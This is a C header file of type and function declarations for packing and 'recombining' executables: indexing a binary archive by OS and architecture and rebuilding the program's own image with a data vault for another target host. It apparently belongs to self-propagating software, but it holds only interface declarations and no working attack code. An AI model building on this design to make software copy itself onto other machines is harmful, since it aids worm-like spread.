/*
* Copyright (c) 2019-2021 David Timber <mieabby@gmail.com>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#pragma once
#include <stdint.h>
#include <stdbool.h>

#include "protocol.h"

#include <zlib.h>


typedef struct prne_bin_host prne_bin_host_t;
typedef struct prne_bin_tuple prne_bin_tuple_t;
typedef struct prne_bin_archive prne_bin_archive_t;
typedef struct prne_bin_rcb_ctx prne_bin_rcb_ctx_t;
typedef struct prne_rcb_param prne_rcb_param_t;

typedef enum {
	PRNE_PACK_RC_OK,
	PRNE_PACK_RC_EOF,
	PRNE_PACK_RC_INVAL,
	PRNE_PACK_RC_FMT_ERR,
	PRNE_PACK_RC_ERRNO,
	PRNE_PACK_RC_Z_ERR,
	PRNE_PACK_RC_NO_ARCH,
	PRNE_PACK_RC_UNIMPL_REV,

	NB_PRNE_PACK_RC
} prne_pack_rc_t;

struct prne_bin_host {
	prne_os_t os;
	prne_arch_t arch;
};

struct prne_bin_tuple {
	size_t size;
	prne_bin_host_t host;
};

struct prne_bin_archive {
	const uint8_t *data;
	size_t data_size;
	size_t nb_bin;
	prne_bin_tuple_t *bin;
};

// Recombination Context
struct prne_bin_rcb_ctx {
	void *o_ctx;
	void (*ctx_free_f)(void*);
	ssize_t(*read_f)(
		prne_bin_rcb_ctx_t *ctx,
		uint8_t *buf,
		size_t len,
		prne_pack_rc_t *prc,
		int *err);
};

struct prne_rcb_param {
	const uint8_t *m_self;
	size_t self_len;
	size_t exec_len;
	const uint8_t *m_dv;
	size_t dv_len;
	const prne_bin_archive_t *ba;
	const prne_bin_host_t *self;
};

static const char PRNE_PACK_BA_IDEN_DATA[] = { 'p', 'r', '-', 'b', 'a' };
static const char PRNE_PACK_NYBIN_IDEN_DATA[] = { 'n', 'y', 'b', 'i', 'n' };

bool prne_eq_bin_host (const prne_bin_host_t *a, const prne_bin_host_t *b);
bool prne_bin_host_inrange (const prne_bin_host_t *x);
void prne_init_bin_archive (prne_bin_archive_t *a);
void prne_free_bin_archive (prne_bin_archive_t *a);
prne_pack_rc_t prne_index_bin_archive (
	const uint8_t *data,
	size_t len,
	prne_bin_archive_t *out);

void prne_init_bin_rcb_ctx (prne_bin_rcb_ctx_t *ctx);
void prne_free_bin_rcb_ctx (prne_bin_rcb_ctx_t *ctx);
prne_pack_rc_t prne_start_bin_rcb (
	prne_bin_rcb_ctx_t *ctx,
	const prne_bin_host_t target,
	const prne_bin_host_t *self,
	const uint8_t *m_self,
	const size_t self_len,
	const size_t exec_len,
	const uint8_t *m_dvault,
	const size_t dvault_len,
	const prne_bin_archive_t *ba);
prne_pack_rc_t prne_start_bin_rcb_compat (
	prne_bin_rcb_ctx_t *ctx,
	const prne_bin_host_t target,
	const prne_bin_host_t *self,
	const uint8_t *m_self,
	const size_t self_len,
	const size_t exec_len,
	const uint8_t *m_dvault,
	const size_t dvault_len,
	const prne_bin_archive_t *ba,
	prne_bin_host_t *actual);
ssize_t prne_bin_rcb_read (
	prne_bin_rcb_ctx_t *ctx,
	uint8_t *buf,
	size_t len,
	prne_pack_rc_t *prc,
	int *err);

bool prne_index_nybin (
	const uint8_t *m_nybin,
	const size_t nybin_len,
	const uint8_t **m_dv,
	size_t *dv_len,
	const uint8_t **m_ba,
	size_t *ba_len);

void prne_init_rcb_param (prne_rcb_param_t *rp);
void prne_free_rcb_param (prne_rcb_param_t *rp);

const prne_arch_t *prne_compat_arch (const prne_arch_t arch);

const char *prne_pack_rc_tostr (const prne_pack_rc_t prc);
